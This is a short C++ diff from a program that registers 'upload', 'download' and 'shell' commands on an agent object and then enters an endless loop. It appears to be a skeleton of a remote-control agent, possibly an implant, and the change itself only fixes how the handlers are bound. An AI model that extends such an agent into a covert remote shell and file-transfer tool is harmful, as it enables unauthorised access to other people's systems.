@@ -22,9 +22,9 @@ int main()
 	Command cmdHandler;
 
 
-	cmdHandler.RegisterCommand(UPLOAD_CMD, agent.upload);
-	cmdHandler.RegisterCommand(DOWNLOAD_CMD, agent.download);
-	cmdHandler.RegisterCommand(SHELL_CMD, agent.shell);
+	cmdHandler.RegisterCommand(UPLOAD_CMD, std::bind(&Agent::upload, agent));
+	cmdHandler.RegisterCommand(DOWNLOAD_CMD, std::bind(&Agent::download, agent));
+	cmdHandler.RegisterCommand(SHELL_CMD, std::bind(&Agent::shell, agent));
 
 
 	while (true) {
